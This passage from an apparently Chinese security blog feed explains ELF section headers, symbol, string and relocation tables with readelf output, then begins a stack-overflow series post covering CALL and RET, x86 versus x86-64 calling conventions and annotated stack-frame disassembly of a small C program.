title="sh_type"></a>sh_type</h5><p>节名是一个字符串，只是在链接和编译过程中有意义，但它不能真正地表示节的类型。对于编译器和链接器来说，主要决定节的属性是节的类型（<code>sh_type</code>）和节的标志位（<code>sh_flags</code>）</p><p>节的类型相关常量以<code>SHT_</code>开头，上述<code>readelf -S</code>命令执行的结果省略了该前缀。节区类型定义如表：</p><table><thead><tr><th>名称</th><th>取值</th><th>说明</th></tr></thead><tbody><tr><td>SHT_NULL</td><td>0</td><td>此值标志节区头部是非活动的，没有对应的节区。（无效节）</td></tr><tr><td>SHT_PROGBITS</td><td>1</td><td><strong>程序节</strong>。此节区包含程序定义的信息，其格式和含义都有程序来解释，代码节、数据节都是这种类型</td></tr><tr><td>SHT_SYMTAB</td><td>2</td><td>此节区包含一个<strong>符号表</strong>。目前目标文件对每种类型的节区都只能包含一个，不过这个限制将来可能会发生变化。一般，SHT_SYMTAB节区提供用于链接编辑（指ld而言）的符号，尽管也可用来实现动态链接</td></tr><tr><td>SHT_STRTAB</td><td>3</td><td>此节区包含<strong>字符串表</strong>。目标文件可能包含多个字符串表节区</td></tr><tr><td>SHT_RELA</td><td>4</td><td>此节区包含<strong>重定位表项</strong>，其中可能会有补齐内容（addend），例如32位目标文件中的Elf32_Rela类型。目标文件可能拥有多个重定位节区</td></tr><tr><td>SHT_HASH</td><td>5</td><td>此节区包含<strong>符号哈希表</strong>。所有参与动态链接的目标都必须包含一个符号哈希表。目前，一个目标文件只能包含一个哈希表，不过此限制将来可能会解除</td></tr><tr><td>SHT_DYNAMIC</td><td>6</td><td>此节区包含动态链接的信息。目前一个目标文件中只能包含一个动态节区，将来可能会取消这一限制</td></tr><tr><td>SHT_NOTE</td><td>7</td><td>此节区包含以某种方式来标记文件的信息，即提示信息</td></tr><tr><td>SHT_NOBITS</td><td>8</td><td>表示该节在文件中没有内容，如<code>.bss</code>节。这种类型的节区不占用文件中的空间，其他方面和<code>SHT_PROGBITS</code>相似。尽管此节区不包含任何字节，成员<code>sh_offset</code>中还是会包含概念性的文件偏移</td></tr><tr><td>SHT_REL</td><td>9</td><td>此节区包含重定位表项，其中没有补齐（addends），例如32位目标文件中的Elf32_rel类型。目标文件中可以拥有多个重定位节区</td></tr><tr><td>SHT_SHLIB</td><td>10</td><td>此节区被保留，不过其语义是未规定的。包含此类型节区的程序与ABI不兼容</td></tr><tr><td>SHT_DYNSYM</td><td>11</td><td><strong>动态链接的符号表</strong>。作为一个完整的符号表，它可能包含很多对动态链接而言不必要的符号。因此，目标文件也可以包含一个SHT_DYNSYM节区，其中保存动态链接符号的一个最小集合，以节省空间</td></tr><tr><td>SHT_LOPROC</td><td>0x70000000</td><td>这一段（包含两个边界），是保留给处理器专用语义的</td></tr><tr><td>SHT_HIPROC</td><td>0x7FFFFFFF</td><td>这一段（包含两个边界），是保留给处理器专用语义的</td></tr><tr><td>SHT_LOUSER</td><td>0x80000000</td><td>此值给出保留给应用程序的索引下界</td></tr><tr><td>SHT_HIUSER</td><td>0x8FFFFFFF</td><td>此值给出保留给应用程序的索引上界</td></tr></tbody></table><hr><h5 id="sh-flags"><a href="#sh-flags" class="headerlink" title="sh_flags"></a>sh_flags</h5><p>sh_flags字段定义了一个节区中包含的内容是否可以修改、是否可以执行等消息。如果一个标志位被设置，则该位取值为1。未定义的各位都设置为0。</p><table><thead><tr><th>名称</th><th>取值</th><th>含义</th></tr></thead><tbody><tr><td>SHF_WRITE</td><td>0x1</td><td>表示该节在进程空间中可写</td></tr><tr><td>SHF_ALLOC</td><td>0x2</td><td>表示该节在进程空间中需要分配空间。有些包含指示或控制信息的节不需要在进程空间中分配空间，就不会有这个标志。</td></tr><tr><td>SHF_EXECINSTR</td><td>0x4</td><td>表示该节在进程空间中可以被执行</td></tr><tr><td>SHF_MASKPROC</td><td>0xF0000000</td><td></td></tr></tbody></table><p>其中已经定义了的各位含义如下：</p><ul><li>SHF_WRITE：节区包含进程执行过程中将可写的数据</li><li>SHF_ALLOC：此节区在进程执行中占用内存。某些控制节区并不出现于目标文件的内存映像中，对于那些节区，此位应设置为0</li><li>SHF_EXECINSTR：节区包含可执行的机器指令</li><li>SHF_MASKPROC：所有包含于此掩码中的四位都用于处理器专用的语义</li></ul><hr><h5 id="sh-link和sh-info"><a href="#sh-link和sh-info" class="headerlink" title="sh_link和sh_info"></a>sh_link和sh_info</h5><p>如果节的类型是与链接有关的（无论是动态链接还是静态链接），如<strong>重定位表、符号表</strong>等，则<code>sh_link</code>、<code>sh_info</code>两个成员所包含的意义如下所示。其它类型的节中这两个成员没有意义。</p><p>根据节区类型的不同，sh_link和sh_info的具体含义也有所不同：</p><p><img src= "/img/loading.gif" data-lazy-src="http://cdn.peckerwood.top/3-4-1.png" alt="png"></p><hr><h3 id="ELF-Sections"><a href="#ELF-Sections" class="headerlink" title="ELF Sections"></a>ELF Sections</h3><h4 id="节的分类"><a href="#节的分类" class="headerlink" title="节的分类"></a>节的分类</h4><p><strong>.text</strong></p><p><code>.text</code>节是保存了程序代码指令的代码节。一段可执行程序，如果存在Phdr，则<code>.text</code>节就会存在于<code>text</code>段中。由于<code>.text</code>节保存了程序代码，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.rodata</strong></p><p><code>.rodata</code>节保存了只读的数据，如一行c语言代码中的字符串。由于<code>.rodata</code>节是只读的，所以只能存在于一个可执行文件的<strong>只读段</strong>中。因此，只能在<code>text</code>段（而不是<code>data</code>段）中找到<code>.rodata</code>节。由于<code>.rodata</code>节是只读的，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.plt</strong></p><p><code>.plt</code>节也称为<strong>过程链接表（Procedure Linkage Table）</strong>，其包含了动态链接器调用从共享库导入的函数所必需的相关代码。由于<code>.plt</code>节保存了代码，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.data</strong></p><p><code>.data</code>节存在于<code>data</code>段中，<strong>其保存了初始化的全局变量等数据</strong>。由于<code>.data</code>节保存了程序的变量数据，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.bss</strong></p><p><code>.bss</code>节存在于<code>data</code>段中，占用空间不超过4字节，仅表示这个节本来的空间。<code>.bss</code>节保存了未进行初始化的全局数据。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于<code>.bss</code>节未保存实际的数据，所以节类型为<code>SHT_NOBITS</code>。</p><p><strong>.got.plt</strong></p><p><code>.got</code>节保存了全局偏移量。<code>.got</code>节和<code>.plt</code>节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改。由于<code>.got .plt</code>节与程序执行有关，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.dynsym</strong></p><p><code>.dynsym</code>节保存在<code>text</code>段中。其保存了从共享库导入的动态符号表。节类型为<code>SHT_DYNSYM</code>。</p><p><strong>.dynstr</strong></p><p><code>.dynstr</code>保存了动态链接字符串表，表中存放了一系列字符串，这些字符串代表了符号名称，以空字符作为终止符。</p><p><strong>.rel.name .relaname</strong></p><p>name根据重定位所适用的节区给定。例如<code>.text</code>节区的重定位节区名字将是：<code>.rel.text</code>或者<code>.rela.text</code>。重定位表保存了重定位相关的信息，这些信息描述了如何在链接或运行时，对ELF目标文件的某些部分或者进程镜像进行补充或者修改。由于重定位表保存了重定位相关的数据，所以节类型为<code>SHT_REL</code>。</p><p><strong>.hash</strong></p><p><code>.hash</code>节也称为<code>.gnu.hash</code>，其保存了一个用于查找符号的散列表。</p><p><strong>.symtab</strong></p><p><code>.symtab</code>节是一个<code>ElfN_Sym</code>的数组，保存了符号信息。节类型为<code>SHT_SYMTAB</code>。</p><p><strong>.strtab</strong></p><p><code>.strtab</code>节保存的是符号字符串表，表中的内容会被<code>.symtab</code>的<code>ElfN_Sym</code>结构中的<code>st_name</code>引用。节类型为<code>SHT_STRTAB</code>。</p><p><strong>.ctors&amp;.dtors</strong></p><p><code>ctors</code>（构造器）节和<code>.dtors</code>（析构器）节分别保存了指向构造函数和析构函数的函数指针，构造函数是在main函数执行之前需要执行的代码；析构函数是在main函数之后需要执行的代码。</p><p>我们可以使用readelf工具来查看节头表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~$ readelf -S /bin/sh</span><br><span class="line">There are 30 section headers, starting at offset 0x1f398:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         0000000000000318  00000318</span><br><span class="line">       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.gnu.propert NOTE             0000000000000338  00000338</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE             0000000000000358  00000358</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .note.ABI-tag     NOTE             000000000000037c  0000037c</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 5] .gnu.hash         GNU_HASH         00000000000003a0  000003a0</span><br><span class="line">       00000000000002d8  0000000000000000   A       6     0     8</span><br><span class="line">  [ 6] .dynsym           DYNSYM           0000000000000678  00000678</span><br><span class="line">       0000000000001158  0000000000000018   A       7     1     8</span><br><span class="line">  [ 7] .dynstr           STRTAB           00000000000017d0  000017d0</span><br><span class="line">       00000000000006b6  0000000000000000   A       0     0     1</span><br><span class="line">  [ 8] .gnu.version      VERSYM           0000000000001e86  00001e86</span><br><span class="line">       0000000000000172  0000000000000002   A       6     0     2</span><br><span class="line">  [ 9] .gnu.version_r    VERNEED          0000000000001ff8  00001ff8</span><br><span class="line">       0000000000000070  0000000000000000   A       7     1     8</span><br><span class="line">  [10] .rela.dyn         RELA             0000000000002068  00002068</span><br><span class="line">       0000000000001b00  0000000000000018   A       6     0     8</span><br><span class="line">  [11] .rela.plt         RELA             0000000000003b68  00003b68</span><br><span class="line">       00000000000007f8  0000000000000018  AI       6    25     8</span><br><span class="line">  [12] .init             PROGBITS         0000000000005000  00005000</span><br><span class="line">       000000000000001b  0000000000000000  AX       0     0     4</span><br><span class="line">  [13] .plt              PROGBITS         0000000000005020  00005020</span><br><span class="line">       0000000000000560  0000000000000010  AX       0     0     16</span><br><span class="line">  [14] .plt.got          PROGBITS         0000000000005580  00005580</span><br><span class="line">       0000000000000020  0000000000000010  AX       0     0     16</span><br><span class="line">  [15] .plt.sec          PROGBITS         00000000000055a0  000055a0</span><br><span class="line">       0000000000000550  0000000000000010  AX       0     0     16</span><br><span class="line">  [16] .text             PROGBITS         0000000000005af0  00005af0</span><br><span class="line">       0000000000011cf5  0000000000000000  AX       0     0     16</span><br><span class="line">  [17] .fini             PROGBITS         00000000000177e8  000177e8</span><br><span class="line">       000000000000000d  0000000000000000  AX       0     0     4</span><br><span class="line">  [18] .rodata           PROGBITS         0000000000018000  00018000</span><br><span class="line">       0000000000001f42  0000000000000000   A       0     0     32</span><br><span class="line">  [19] .eh_frame_hdr     PROGBITS         0000000000019f44  00019f44</span><br><span class="line">       0000000000000804  0000000000000000   A       0     0     4</span><br><span class="line">  [20] .eh_frame         PROGBITS         000000000001a748  0001a748</span><br><span class="line">       00000000000031a8  0000000000000000   A       0     0     8</span><br><span class="line">  [21] .init_array       INIT_ARRAY       000000000001ef30  0001df30</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .fini_array       FINI_ARRAY       000000000001ef38  0001df38</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [23] .data.rel.ro      PROGBITS         000000000001ef40  0001df40</span><br><span class="line">       0000000000000bc8  0000000000000000  WA       0     0     32</span><br><span class="line">  [24] .dynamic          DYNAMIC          000000000001fb08  0001eb08</span><br><span class="line">       00000000000001f0  0000000000000010  WA       7     0     8</span><br><span class="line">  [25] .got              PROGBITS         000000000001fcf8  0001ecf8</span><br><span class="line">       00000000000002f0  0000000000000008  WA       0     0     8</span><br><span class="line">  [26] .data             PROGBITS         0000000000020000  0001f000</span><br><span class="line">       0000000000000240  0000000000000000  WA       0     0     32</span><br><span class="line">  [27] .bss              NOBITS           0000000000020240  0001f240</span><br><span class="line">       0000000000002c30  0000000000000000  WA       0     0     32</span><br><span class="line">  [28] .gnu_debuglink    PROGBITS         0000000000000000  0001f240</span><br><span class="line">       0000000000000034  0000000000000000           0     0     4</span><br><span class="line">  [29] .shstrtab         STRTAB           0000000000000000  0001f274</span><br><span class="line">       000000000000011d  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br></pre></td></tr></table></figure><h4 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h4><p>节的分类中我们介绍了<code>.dynsym</code>节和<code>.symtab</code>节，两者都是符号表。那么它们到底有什么区别呢？存在什么关系呢？</p><p><strong>符号是对某些类型的数据或代码（如全局变量或函数）的符号引用，函数名或变量名就是符号名</strong>。例如，<code>printf()</code>函数会在动态链接符号表<code>.dynsym</code>中存有一个指向该函数的符号项（以<code>Elf_Sym</code>数据结构表示）。在大多数共享库和动态链接可执行文件中，存在两个符号表。即<code>.dynsym</code>和<code>.symtab</code>。</p><p><strong><code>.dynsym</code>保存了引用来自外部文件符号的全局符号</strong>。如<code>printf</code>库函数。**<code>.dynsym</code>保存的符号是<code>.symtab</code>所保存符合的子集，<code>.symtab</code>中还保存了可执行文件的本地符号**。如全局变量，代码中定义的本地函数等。</p><p>既然<code>.dynsym</code>是<code>.symtab</code>的子集，那为何要同时存在两个符号表呢？</p><p>通过<code>readelf -S</code>命令可以查看可执行文件的输出，一部分节标志位（<code>sh_flags</code>）被标记为了<strong>A（ALLOC）、WA（WRITE&#x2F;ALLOC）、AX（ALLOC&#x2F;EXEC）</strong>。其中，<code>.dynsym</code>被标记为ALLOC，而<code>.symtab</code>则没有标记。</p><p>ALLOC表示有该标记的节会在运行时分配并装载进入内存，而<code>.symtab</code>不是在运行时必需的，因此不会被装载到内存中。**<code>.dynsym</code>保存的符号只能在运行时被解析，因此是运行时动态链接器所需的唯一符号**。<code>.dynsym</code>对于动态链接可执行文件的执行是必需的，而<code>.symtab</code>只是用来进行调试和链接的。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/ELF/5.png" alt="img"></p><p>上图所示为通过符号表索引字符串表的示意图。符号表中的每一项都是一个<code>Elf_Sym</code>结构，对应可以在字符串表中索引得到一个字符串。该数据结构符号表项的格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word st_name;     <span class="comment">//符号名。该值为该符号名在字符串表中的偏移地址。</span></span><br><span class="line">    Elf32_Addr st_value;    <span class="comment">//符号对应的值。存放符号的值（可能是地址或位置偏移量）。</span></span><br><span class="line">    Elf32_Word st_size;     <span class="comment">//符号的大小。</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_info;  <span class="comment">//此成员给出符号的类型和绑定属性。下面给出若干取值和含义的绑定关系</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">//符号所在的节</span></span><br><span class="line">    Elf32_Half st_shndx;    <span class="comment">//符号类型及绑定属性</span></span><br><span class="line">&#125; Elf32_sym;</span><br></pre></td></tr></table></figure><h4 id="字符串表"><a href="#字符串表" class="headerlink" title="字符串表"></a>字符串表</h4><p>类似于符号表，在大多数共享库和动态链接可执行文件中，也存在两个字符串表。即<code>.dynstr</code>和<code>.strtab</code>，分别对应于<code>.dynsym</code>和<code>symtab</code>。此外，还有一个<code>.shstrtab</code>的节头字符串表，用于保存节头表中用到的字符串，可通过<code>sh_name</code>进行索引。</p><p>ELF文件中所有字符表的结构基本一致，如上图所示。</p><h4 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h4><p><strong>重定位就是将符号定义和符号引用进行连接的过程</strong>。可重定位文件需要包含描述如何修改节内容的相关信息，从而使可执行文件和共享目标文件能够保存进程的程序镜像所需要的正确信息。</p><p>重定位表是进行重定位的重要依据。我们可以使用objdump工具查看目标文件的重定位表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;  <span class="comment">//重定位入口的偏移。</span></span><br><span class="line">                          <span class="comment">//对于可重定位文件来说，这个值是该重定位入口所要修正的位置的第一个字节相对于节起始的偏移</span></span><br><span class="line">                          <span class="comment">//对于可执行文件或共享对象文件来说，这个值是该重定位入口所要修正的位置的第一个字节的虚拟地址</span></span><br><span class="line">    Elf32_word r_info;    <span class="comment">//重定位入口的类型和符号</span></span><br><span class="line">                          <span class="comment">//对于可执行文件和共享目标文件来说，它们的重定位入口是动态链接类型的。</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info;</span><br><span class="line">    Elf32_Word r_addend;  <span class="comment">//此成员给出一个常量补齐，用来计算将被填充到可重定位字段的数值。</span></span><br><span class="line">&#125; Elf32_Rela;</span><br></pre></td></tr></table></figure><blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.chuquan.me/2018/05/21/elf-introduce/</span><br><span class="line">https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux栈溢出总结（0x02）</title>
    <link href="https://www.ascotbe.com/2020/11/20/StackOverflow_Linux_0x02/"/>
    <id>https://www.ascotbe.com/2020/11/20/StackOverflow_Linux_0x02/</id>
    <published>2020-11-20T10:45:42.000Z</published>
    <updated>2022-04-07T13:00:41.923Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>在上篇中介绍了一些常见保护，以及如何开关，还有如何生成shellcode等操作，就那么点东西我搞了一星期，真是菜吐了，心态崩了了</p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/11.png" alt="222" style="zoom:50%;" /><blockquote><h2 id="写在前面的几个笔记"><a href="#写在前面的几个笔记" class="headerlink" title="写在前面的几个笔记"></a>写在前面的几个笔记</h2></blockquote><div class="note default modern"><p>CALL和RET指令解释</p></div><ul><li><strong>CALL</strong>指令调用某个子函数时，下一条指令的地址作为返回地址被保存到栈中。等价于<strong>PUSH</strong>返回地址与<strong>JMP</strong>函数地址的指令序列</li><li><strong>RET</strong>指令跳转到<strong>CALL</strong>指令保存的返回地址，讲控制权交还给调用函数。等价于<strong>POP</strong>返回地址与<strong>JMP</strong>返回地址的指令序列</li></ul><div class="note default modern"><p>AMD64和i386的区别</p></div><p>由于后面的利用方式可能会用到64位的程序，所以在前面把两者几个点需要区别下</p><ul><li>首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则就会抛出异常。</li><li>其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在<strong>RDI</strong>、<strong>RSI</strong>、<strong>RDX</strong>、<strong>RCX</strong>、 <strong>R8</strong>和<strong>R9</strong>中，如果还有更多的参数的话才会保存在栈上。</li></ul><blockquote><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2></blockquote><p>函数调用栈是一块连续的用来保存函数运行状态的内存区域，调用函数（caller）和被调用函数 （callee）根据调用关系堆叠起来，从内存的高地址向低地址增长。</p><p>一个典型的栈帧布局如下所示:</p><ol><li>函数参数</li><li>函数返回地址</li><li>帧指针</li><li>错误处理帧</li><li>局部变量</li><li>栈缓冲区</li><li>被调函数保存的寄存器</li></ol><p>栈帧的布局如下图所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/24.png" alt="img"></p><blockquote><h4 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h4></blockquote><p>演示代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> arg1, <span class="type">int</span> arg2, <span class="type">int</span> arg3, <span class="type">int</span> arg4, <span class="type">int</span> arg5, <span class="type">int</span> arg6, <span class="type">int</span> arg7, <span class="type">int</span> arg8)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="type">int</span> loc1 = arg1 + <span class="number">1</span>; </span><br><span class="line">  <span class="type">int</span> loc8 = arg8 + <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">return</span> loc1 + loc8; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> <span class="built_in">func</span>(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">88</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -m32 stack.c -o stack32</span></span><br><span class="line"><span class="comment">// gcc stack.c -o stack64</span></span><br></pre></td></tr></table></figure><blockquote><h4 id="栈的分布图"><a href="#栈的分布图" class="headerlink" title="栈的分布图"></a>栈的分布图</h4></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/25.png" alt="image-20210314150418220"></p><blockquote><h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4></blockquote><ul><li>被调用函数func()的8个参数从后向前依次入栈</li><li>当执行call指令时，下一条指令的地址<code>0x08048415 </code>作为返回地址入栈。</li><li>然后程序跳转到func()，在函数开头将调用函数的ebp压栈保存并更新为当前的栈顶地址esp作为新的栈基址，而esp则下移为局部变量开辟空间。</li><li>函数返回时则相反，通过leave指令将esp恢复为当前的ebp，并从栈中将调用者的ebp弹出，最后ret指令弹出返回地址作为eip，程序回到main()函数中，最后抬高esp清理被调用者的参数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#X86中的栈</span><br><span class="line">gef➤ disassemble main 0x080483fd &lt;+0&gt;: push ebp                   # 将栈底 ebp 压栈 (esp -= 4) </span><br><span class="line">0x080483fe &lt;+1&gt;: mov ebp,esp                                      # 更新 ebp 为当前栈顶 esp </span><br><span class="line">0x08048400 &lt;+3&gt;: push 0x58                                        # 将 arg8 压栈 (esp -= 4) </span><br><span class="line">0x08048402 &lt;+5&gt;: push 0x4d                                        # 将 arg7 压栈 (esp -= 4) </span><br><span class="line">0x08048404 &lt;+7&gt;: push 0x42                                        # 将 arg6 压栈 (esp -= 4) </span><br><span class="line">0x08048406 &lt;+9&gt;: push 0x37                                        # 将 arg5 压栈 (esp -= 4) </span><br><span class="line">0x08048408 &lt;+11&gt;:push 0x2c                                        # 将 arg4 压栈 (esp -= 4) </span><br><span class="line">0x0804840a &lt;+13&gt;:push 0x21                                        # 将 arg3 压栈 (esp -= 4) </span><br><span class="line">0x0804840c &lt;+15&gt;:push 0x16                                        # 将 arg2 压栈 (esp -= 4) </span><br><span class="line">0x0804840e &lt;+17&gt;:push 0xb                                         # 将 arg1 压栈 (esp -= 4) </span><br><span class="line">0x08048410 &lt;+19&gt;:call 0x80483db &lt;func&gt;                            # 调用 func (push 0x08048415) </span><br><span class="line">0x08048415 &lt;+24&gt;:add esp,0x20                                     # 恢复栈顶 esp </span><br><span class="line">0x08048418 &lt;+27&gt;:leave                                            # (mov esp, ebp; pop ebp) </span><br><span class="line">0x08048419 &lt;+28&gt;:ret                                              # 函数返回 (pop eip) </span><br><span class="line">gef➤ disassemble func 0x080483db &lt;+0&gt;: push ebp                   # 将栈底 ebp 压栈 (esp -= 4) </span><br><span class="line">0x080483dc &lt;+1&gt;: mov ebp,esp                                      # 更新 ebp 为当前栈顶 esp </span><br><span class="line">0x080483de &lt;+3&gt;: sub esp,0x10                                     # 为局部变量开辟栈空间 </span><br><span class="line">0x080483e1 &lt;+6&gt;: mov eax,DWORD PTR [ebp+0x8]                      # 取出 arg1 </span><br><span class="line">0x080483e4 &lt;+9&gt;: add eax,0x1                                      # 计算 loc1 </span><br><span class="line">0x080483e7 &lt;+12&gt;:mov DWORD PTR [ebp-0x8],eax                      # loc1 放入栈 </span><br><span class="line">0x080483ea &lt;+15&gt;:mov eax,DWORD PTR [ebp+0x24]                     # 取出 arg8 </span><br><span class="line">0x080483ed &lt;+18&gt;:add eax,0x8                                      # 计算 loc8 </span><br><span class="line">0x080483f0 &lt;+21&gt;:mov DWORD PTR [ebp-0x4],eax                      # loc8 放入栈 </span><br><span class="line">0x080483f3 &lt;+24&gt;:mov edx,DWORD PTR [ebp-0x8] </span><br><span class="line">0x080483f6 &lt;+27&gt;:mov eax,DWORD PTR [ebp-0x4] </span><br><span class="line">0x080483f9 &lt;+30&gt;:add eax,edx                                      # 计算返回值 </span><br><span class="line">0x080483fb &lt;+32&gt;:leave                                            # (mov esp, ebp; pop ebp) </span><br><span class="line">0x080483fc &lt;+33&gt;:ret                                              # 函数返回 (pop eip)</span><br></pre></td></tr></table></figure><blockquote><p>x86-64</p></blockquote><ul><li>前6 个参数分别通过rdi、rsi、rdx、rcx、r8和r9进行传递，剩余参数才像x86一样从后向前依次压栈。</li><li>func()并没有下移rsp开辟栈空间的操作，导致rbp和rsp的值是相同的</li></ul><div class="note default modern"><p>其实这是一项编译优化：根据AMD64 ABI文档的描述，rsp以下128字节的区域被称为red 